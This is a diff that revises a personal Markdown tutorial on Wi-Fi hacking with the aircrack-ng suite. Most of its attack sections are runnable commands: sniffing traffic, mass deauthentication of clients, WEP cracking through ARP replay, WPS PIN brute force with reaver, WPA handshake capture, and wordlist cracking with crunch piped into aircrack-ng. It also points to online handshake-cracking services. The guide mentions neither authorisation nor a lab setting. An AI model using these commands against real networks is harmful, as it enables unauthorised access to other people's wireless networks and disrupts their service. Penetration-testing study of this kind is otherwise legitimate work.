@@ -1,5 +1,7 @@
 # Wi-Fi Hacking
 
+This document describes a few Wi-Fi hacking techniques.
+
 ## Table of Contents
 
 - [Setting up the AWUS1900](#setting-up-the-awus1900)
@@ -18,9 +20,10 @@
 - [WPA and WPA2 Cracking](#wpa-and-wpa2-cracking)
   - [Creating a wordlist](#creating-a-wordlist)
   - [Crack the WPA password based with a wordlist](#crack-the-wpa-password-based-with-a-wordlist)
+- [Speed up the cracking process](#speed-up-the-cracking-process)
 - [Other tools](#other-tools)
   - [wifite](#wifite)
-  - [See also](#see-also)
+- [See also](#see-also)
 - [Resources](#resources)
 
 
@@ -28,20 +31,24 @@
 
 Check if the system detected the AWUS1900, for this, run `dmesg` and look:
 
-```
+````commandline
 [  189.267471] usb 1-1: new high-speed USB device number 2 using ehci-pci
 [  189.641364] usb 1-1: New USB device found, idVendor=0bda, idProduct=8813, bcdDevice= 0.00
 [  189.641365] usb 1-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3
 [  189.641367] usb 1-1: Product: 802.11ac NIC
 [  189.641367] usb 1-1: Manufacturer: Realtek
 [  189.641368] usb 1-1: SerialNumber: 123456
-```
+````
 
 then:
 
-        install realtek-rtl88xxau-dkms
+````commandline
+apt install realtek-rtl88xxau-dkms
+````
 
 Then reboot the virtual machine, yes, requires a reboot before this will work.
+
+_Note, it could be after some kernel updates (I guess), that you need to reinstall the above package._
 
 ```commandline
 # airmon-ng       
@@ -53,24 +60,27 @@ phy0    wlan0           88XXau          Realtek Semiconductor Corp. RTL8814AU 80
 
 ## aircrack-ng suite
 
-The aircrack-ng suite consists of:
+The aircrack-ng suite consists of a lot of tools actually, each tool has his own purpose. It's good to check out the documentation of each tool.
 
-* aircrack-ng
-* airdecap-ng
-* airmon-ng
-* aireplay-ng
-* airodump-ng
-* airtun-ng
-* packetforge-ng
-* airbase-ng
-* airdecloak-ng
-* airolib-ng
-* airserv-ng
-* buddy-ng
-* ivstools
-* easside-ng
-* tkiptun-ng
-* wesside-ng
+- [airbase-ng](https://www.aircrack-ng.org/doku.php?id=airbase-ng)
+- [aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng)
+- [airdecap-ng](https://www.aircrack-ng.org/doku.php?id=airdecap-ng)
+- [airdecloak-ng](https://www.aircrack-ng.org/doku.php?id=airdecloak-ng)
+- [airdriver-ng](https://www.aircrack-ng.org/doku.php?id=airdriver-ng) - REMOVED in 1.2 rc 1
+- [airdrop-ng](https://www.aircrack-ng.org/doku.php?id=airdrop-ng)
+- [aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
+- [airgraph-ng](https://www.aircrack-ng.org/doku.php?id=airgraph-ng)
+- [airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
+- [airodump-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
+- [airolib-ng](https://www.aircrack-ng.org/doku.php?id=airolib-ng)
+- [airserv-ng](https://www.aircrack-ng.org/doku.php?id=airserv-ng)
+- [airtun-ng](https://www.aircrack-ng.org/doku.php?id=airtun-ng)
+- [besside-ng](https://www.aircrack-ng.org/doku.php?id=besside-ng)
+- [dcrack](https://www.aircrack-ng.org/doku.php?id=dcrack)
+- [easside-ng](https://www.aircrack-ng.org/doku.php?id=easside-ng)
+- [packetforge-ng](https://www.aircrack-ng.org/doku.php?id=packetforge-ng)
+- [tkiptun-ng](https://www.aircrack-ng.org/doku.php?id=tkiptun-ng)
+- [wesside-ng](https://www.aircrack-ng.org/doku.php?id=wesside-ng)
 
 ## Change the mac address of a network device
 
@@ -78,13 +88,15 @@ You should know that each network device has a so said unique identifier. A so s
 
 To be able to change the mac address of a network device, this first need to be put down (deactivated). 
 
-    ifconfig wlan0 down
-    ifconfig wlan0 hw ether 00:11:22:33:44:55
-    ifconfig wlan0 up
+````commandline
+ifconfig wlan0 down
+ifconfig wlan0 hw ether 00:11:22:33:44:55
+ifconfig wlan0 up
+````
 
 Note that when you reboot the computer the mac address is changed back to its original reference.
 
-See also the tool `macchanger` for the lazy people.
+**See also the tool `macchanger` for the lazy people. Note that if you want to change your mac address with `macchanger`, your interface needs to be down! The error message if the interface is up is very confusing.**
 
 ## Wi-Fi monitor mode requirements
 
@@ -102,7 +114,7 @@ Also the brand of the wi-fi adapter doesn't matter, what matter the most is the 
 
 See also:
 
- * https://www.youtube.com/watch?v=0lqRZ3MWPXY
+- <https://www.youtube.com/watch?v=0lqRZ3MWPXY>
 
 ### Know working chipsets with Kali
 
@@ -111,14 +123,16 @@ See also:
 
 See also:
 
- * https://kennyvn.com/best-wireless-adapters-kali-linux/
+- <https://kennyvn.com/best-wireless-adapters-kali-linux/>
 
 ## Change the Wi-Fi mode from managed to monitor
 
-Check that nothing is using the wlan0 device and could interfere:
+Check that nothing is using the `wlan0` device and could interfere:
 
-    ifconfig wlan0 down
-    airmon-ng check kill
+````commandline
+ifconfig wlan0 down
+airmon-ng check kill
+````
 
 It will output something like:
 
@@ -128,35 +142,51 @@ Killing these processes:
     719     wpa_supplicant
     11318   dhcpclient
 
-Change the mode:
+Change the mode to monitor mode:
 
-    iwconfig wlan0 mode monitor
+````commandline
+iwconfig wlan0 mode monitor
+````
 
-Some wireless interfaces will be called `mon0` or something similar when in monitor mode. In the case of the the AWUS1900, this stays `wlan0`.
+Or:
+
+````commandline
+airmon-ng start wlan0
+````
+
+Some wireless interfaces will be called `mon0` or something similar when in monitor mode. In the case of the `AWUS1900`, this stays `wlan0`.
 
 ## Sniffing Wi-Fi packets
 
 By sniffing I mean copying all Wi-Fi packages that are in range.
 
-Check how your wifi card is called with `ifwconfig` after having set it in monitor mode.
+Check how your Wi-Fi card is called with `ifwconfig` after having set it in monitor mode.
 
-    airodump-ng wlan0
+````commandline
+airodump-ng wlan0
+````
 
 To sniff on 5G (band a)
 
-    airodump-ng --band a wlan0
+````commandline
+airodump-ng --band a wlan0
+````
 
 To sniff on all different bands 2.4G and 5G:
 
 Note that this requires a stronger adapter and is a bit slower as it's sniffing on different network speed.
 
-    airodump-ng --band abc mon0
+````commandline
+airodump-ng --band abc mon0
+````
 
 ### Write data to a file
 
 This allows us to analyse and crack the actual thingy later on.
 
-    airodump-ng --write my_captured_data mon0
+````commandline
+airodump-ng --write my_captured_data mon0
+````
 
 A file starting with the name `my_captured_data` will be created in the current directory and with different extensions. Note that airodump added append `-01` to the file name.
 
@@ -168,28 +198,34 @@ You can look at the data with `WireShark`. But like said, the data inside is enc
 
 ### Targeted Packet Sniffing
 
-We can also define to sniff on a know ESSID:
+We can also define to sniff on a know `ESSID`:
 
 for example:
 
-    airodump-ng --bssid F8:23:B2:B9:50:A8 --channel 2 --write my_captured_data wlan0
+````commandline
+airodump-ng --bssid F8:23:B2:B9:50:A8 --channel 2 --write my_captured_data wlan0
+````
 
 ### Deauthentication Attack
 
 To disconnect any client from any network.
 
- * Works on encrypted networks (WEP, WPA, & WPA2).
- * No need to know the network key/password.
- * No need to connect to the network.
+- Works on encrypted networks (WEP, WPA, & WPA2).
+- No need to know the network key/password.
+- No need to connect to the network.
 
-    aireplay-ng --death [#DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
+```commandline
+aireplay-ng --death [#DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
+```
    
 For example:
 
-    aireplay-ng --death 100000000 -a F8:23:B2:B9:50:A8 -c 80:E6:50:22:A2:E8 (-D)  wlan0 
-    # -D for the 5G wifi
+````commandline
+aireplay-ng --death 100000000 -a F8:23:B2:B9:50:A8 -c 80:E6:50:22:A2:E8 (-D)  wlan0 
+# -D for the 5G wifi
+````
 
-In some rare cases, the aireplay-ng --deauth fails, and in that case you should run the airodump sniffing at the same time in another shell.
+In some rare cases, the `aireplay-ng --deauth` fails, and in that case you should run the `airodump-ng` sniffing at the same time in another shell.
 
 Goals
 
@@ -200,17 +236,21 @@ Goals
 
 WEP stand for Wired Equivalent Privacy.
 
-We need to capture a large number of packets/IVs. So this needs to be done when people are using that wireless network. If there's not a lot of traffic this will take ages to have the numbers of data packets. But then, we need to force the AP to generate new IVs and this is called the arpattack.
+We need to capture a large number of packets/IVs. So this needs to be done when people are using that wireless network. If there's not a lot of traffic this will take ages to have the numbers of data packets. But then, we need to force the AP to generate new IVs and this is called the arp attack.
 
 You should consider to have around 40.000 data packets before trying to crack the packets. And this for the longest 128bit wep key. So it goes very very fast even with the strongest and longest WEP password..
 
 Capture the packets with `airodump-ng`:
 
-    airodump-ng --bssid <mac-of-AP> --channel <channel-number> --write web_capture mon0
+````commandline
+airodump-ng --bssid <mac-of-AP> --channel <channel-number> --write web_capture mon0
+````
 
 Analyse the captured IVs and crack the key `aircrack-ng`
 
-    aircrack-ng web_capture-01.cap
+````commandline
+aircrack-ng web_capture-01.cap
+````
 
 After a time it should give you the key and password. Sometimes it does not show you the password but only the key.
 
@@ -235,9 +275,11 @@ To do so, first you need to be connected (not associated) to the AP.
 
 Then will see with `aircrack-ng` that your are connected to the APP.
 
-So now it's time to ARP replay
+So now it's time to ARP replay:
 
-    Then airereplay-ng --arpreplay -b <mac-of-AP> -h <mac-of-wireless-adapter> mon0
+````commandline
+airereplay-ng --arpreplay -b <mac-of-AP> -h <mac-of-wireless-adapter> mon0
+````
 
 Then we need to wait that `aireplay` capture an ARP packet. Once it has got one it will force the AP to resend it over and over.
 
@@ -253,17 +295,23 @@ A lot of routers do have the WPS feature. If the router is badly configured, we 
 
 First scan to see which AP do make use of WPS:
 
-    wash --interface wlan0
+````commandline
+wash --interface wlan0
+````
 
 Brut force the pin to try to get the WPA key
 
-    reaver --bssid <mac-target> --channel <number> --interface wlan0 -vvv --no-associate
+````commandline
+reaver --bssid <mac-target> --channel <number> --interface wlan0 -vvv --no-associate
+````
 
 *Some newer `reaver` version has some bug and fails, so it could be we need to download and use an older version of `reaver`*
 
 Then we need to fake auth, every 30 seconds:
 
-    aireplay-ng --fakeauth 30 -a <mac-target> <mac-of-wireless-adapter> wlan0
+````commandline
+aireplay-ng --fakeauth 30 -a <mac-target> <mac-of-wireless-adapter> wlan0
+````
 
 ## WPA and WPA2 Cracking
 
@@ -275,93 +323,76 @@ Good to know is that WPA and WPA2 fixes the weaknesses of WEP. So in this versio
 
 From there on, we need to guess (brut force) the data with a wordlist. We can download read to use wordlist from the internet, or generate our own one with a program.
 
-    airodump-ng --bssid <mac-target> --channel <channel-number> --write wpa_handshake mon0
+````commandline
+airodump-ng --bssid <mac-target> --channel <channel-number> --write wpa_handshake mon0
+````
 
-Now we need to wait that a client connect, because it's only during connection time that handshare are send. But like before with the WEP attack we can force the deauthentication process, in order words, force that handshakes are send.
+Now we need to wait that a client connect, because it's only during connection time that handshake are sent. But like before with the WEP attack we can force the deauthentication process, in order words, force that handshakes are sent.
 
-    aireplay-ng -deauth 4 -a <mac-target> -c <mac-of-wireless-adapter> wlan0
+````commandline
+aireplay-ng -deauth 4 -a <mac-target> -c <mac-of-wireless-adapter> wlan0
+````
 
-We need to keep an eye on the airodump-ng output, and when it has the WPA handshake, we can stop aerodump-ng.
-
-### Creating a wordlist
-
-`crunch` can be used to create a wordlist.
-
-For example, generate a word list with 6 up to 8 characters long. With only the characters `123abc$` and with the words that start with `a` and end with the letter `b`.
-
-    crunch 6 8 123abc$ -o wordlist -t a@@@@b
-
-Note that creating a wordlist can become huge, very very very very very huge. Look at this example, which will result in a wordlist of 1592 TB !
-
-    $ crunch 6 8 "123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" -o crunch_wordlist 
-    Crunch will now generate the following amount of data: 1750868402284224 bytes
-    1669758226 MB
-    1630623 GB
-    1592 TB
-    1 PB
-    Crunch will now generate the following number of lines: 194901576207663
-    crunch:   0% completed generating output
-
-Even when using the compression option it's still very very huge, no matter what compression method you use:
-
-    $ crunch 6 8 "123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" -o crunch_wordlist -z lzma
-    Crunch will now generate the following amount of data: 1750868402284224 bytes
-    1669758226 MB
-    1630623 GB
-    1592 TB
-    1 PB
-    Crunch will now generate the following number of lines: 194901576207663 
-
-To create a little list:
-
-    crunch 6 8 abc -o crunch_wordlist_short.txt
-
-To specify that the password list should be 6 characters long and start with the letter a and end with the letter b:
-
-    crunch 6 6 abc -o crunch_wordlist_short.txt -t a@@@@b
+We need to keep an eye on the `airodump-ng` output, and when it has the WPA handshake, we can stop `aerodump-ng`.
 
 ### Crack the WPA password based with a wordlist
 
 Before we can proceed to this, we need to have captured a handshake and created a word list. Once we have both of this we can start brut forcing it with:
 
-    aircrack-ng wpa_handshake-01.cap -w my_wordlist.txt
+````commandline
+aircrack-ng wpa_handshake-01.cap -w my_wordlist.txt
+````
 
-The speed of this process depend of your CPU and the amounts of words in your word list it has to test against it. This can really take a lot of time.
+## Speed up the cracking process
+
+The speed of this process depend on your CPU and the amounts of words in your word list it has to test against it. This can really take a lot of time.
 
 **There are online services where you can upload your handshake files and they will compute with their huge word list for you on their huge computer systems.**
 
 Like for example:
 
- * https://gpuhash.me/
- * https://www.onlinehashcrack.com/how-to-crack-WPA-WPA2-networks.php
-
+- <https://gpuhash.me>
+- <https://www.onlinehashcrack.com/how-to-crack-WPA-WPA2-networks.php>
 
 There are also methods to speed up the cracking process:
 
- * Use GPU instead of CPU
- * Rainbow tables
- * You can pïpe the wordlist as it's create its passwords from `crunch` to `aircrack-ng` so that you don't need to create a huge word list file and storage on your computer.
- * You can also use methods so that you can pause the process.
- 
+- Use `GPU` instead of `CPU`.
+- Rainbow tables.
+- You can pipe the wordlist as it's create its passwords from `crunch` to `aircrack-ng` so that you don't need to create a huge word list file and storage on your computer. See man crunch, almost on the bottom: `crunch 2 4 abcdefghijklmnopqrstuvwxyz | aircrack-ng /root/Mycapfile.cap -e MyESSID -w-`
+- You can also use methods so that you can pause the process.
 
- ## Other tools
+````commandline
+crunch 8 8 abcdefghijklmnopqrstuvwxyz | aircrack-ng capture-01.cap -e SamS8P -w-
+````
+
+## Other tools
 
 ### wifite
 
-See also this nice thing `wifite` which is available on Kali: https://github.com/kimocoder/wifite2 Note that the wifite packages has been forket multiples times. So check out which one is the most up to date and which is still developped.
+See also this nice thing `wifite` which is available on `Kali`: <https://github.com/kimocoder/wifite2>. However, it does not work as expected out of the box as it requires some extra packages to be installed which are not packaged and available for `Kali`. And thus, they need to be installed manually.
 
-Note also that on github it's called wifite2, even if in kali, and in it's package information it's called wifite. Actually, the github link i got from the package in Kali.
+Note that the `wifite` packages has been forked multiples times. So check out which one is the most up to date and which is still development.
 
-This python script, according to it's documentation on github, require additional and optional tools
+Note also that on `github` it's called `wifite2`, even if in `kali`, and in its package information it's called `wifite`. Actually it is like so in the `github` link I got from the package in `Kali`.
 
-tshark reaver bully cowpatty ath_masker modwifi pyrit
+This python script, according to its documentation on `github`, require additional and optional tools
 
-    wifite -e Proximus-Home-46A8
+- tshark
+- reaver
+- bully
+- cowpatty
+- ath_masker
+- modwifi
+- pyrit
 
-### See also
+````commandline
+wifite -e Proximus-Home-46A8
+````
 
-* wifi-honey - Wi-Fi honeypot
+## See also
+
+* `wifi-honey` - Wi-Fi honeypot
 
 ## Resources
 
-- ...
+- <https://www.aircrack-ng.org>
